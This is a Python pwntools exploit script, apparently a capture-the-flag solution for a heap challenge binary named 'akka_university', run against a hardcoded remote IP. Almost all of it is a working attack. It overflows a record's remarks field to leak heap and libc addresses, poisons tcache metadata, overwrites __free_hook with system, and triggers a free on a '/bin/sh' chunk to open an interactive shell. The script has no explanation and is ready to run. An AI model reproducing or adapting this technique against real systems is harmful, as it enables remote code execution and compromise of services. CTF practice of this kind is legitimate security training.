from pwn import *

r = remote('3.99.48.161', 9006)
# r = process('./akka_university', env={'LD_PRELOAD':'./libc6_2.31-0ubuntu9.2_amd64.so'})
context.arch = 'x86_64'
context.log_level = 'debug'
bin = ELF('./akka_university')
libc = ELF('./libc6_2.31-0ubuntu9.2_amd64.so')

def create(size, name, mark, remarks, log):
    r.sendlineafter(b'Check out\n>>', b'1')
    r.sendlineafter(b'student record\n>>', str(size).encode())
    r.sendafter(b'name\n>>', name)
    r.sendlineafter(b'marks\n>>', str(mark).encode())
    r.sendafter(b'for the Students\n>>', remarks)
    r.sendafter(b'correcting this paper\n>>', log)

def destroy(idx):
    r.sendlineafter(b'Check out\n>>', b'2')
    r.sendlineafter(b'number of the record\n>>', str(idx).encode())

def view(idx):
    r.sendlineafter(b'Check out\n>>', b'3')
    r.sendlineafter(b'you want to view\n>>', str(idx).encode())

def edit(idx, name, mark, remarks, log):
    r.sendlineafter(b'Check out\n>>', b'4')
    r.sendlineafter(b'record you want to edit\n>>', str(idx).encode())
    r.sendafter(b'student\'s name\n>>', name)
    r.sendlineafter(b'student\'s marks\n>>', str(mark).encode())
    r.sendafter(b'for the Students\n>>', remarks)
    r.sendafter(b'correcting this paper\n>>', log)

def exit():
    r.sendlineafter(b'Check out\n>>', b'5')

create(0x18, b'0'*0x14, 48, b'0'*0x37+b'\n', b'Hello')
create(0x18, b'1'*0x14, 48, b'Hello', b'Hello')
create(0x18, b'2'*0x14, 48, b'Hello', b'Hello')
create(0x28, b'4'*0x14, 48, b'Hello', b'Padding')
create(0x88, b'3'*0x14, 48, b'0'*0x37+b'\n', b'Hello')
create(0x28, b'4'*0x14, 48, b'Hello', b'/bin/sh\x00')
destroy(1)
destroy(2)
edit(0, b'0'*0x14, 48, b'0'*0x38 + b'\xe0', b'Hello')
view(0)
r.recvuntil(b'Hello')
heap_base = u64(r.recv(11)[3:]) - 0x10
log.success('Heap base: %#x' % heap_base)

edit(0, b'0'*0x14, 48, b'0'*0x38 + p64(heap_base+0x10)[:6], p64(2) + p32(0) + p32(0x70000))
destroy(4)
edit(0, b'0'*0x14, 48, b'0'*0x38 + p64(heap_base+0x330)[:6], b'\n')
# gdb.attach(r, '''b*main+201''')
view(0)
r.recvuntil(b'chunk contents\n')
r.recv(8)
libc.address = u64(r.recv(8)) - 0x1ebbe0
log.success('Libc base: %#x' % libc.address)

edit(0, b'0'*0x14, 48, b'0'*0x38 + p64(heap_base + 0x2e0)[:6], p64(libc.symbols['__free_hook']))
create(0x18, b'2'*0x14, 48, b'Hello', b'Hello')
create(0x18, b'2'*0x14, 48, b'Hello', p64(libc.symbols['system']))
# gdb.attach(r, '''b*main+201''')
destroy(5)
r.interactive()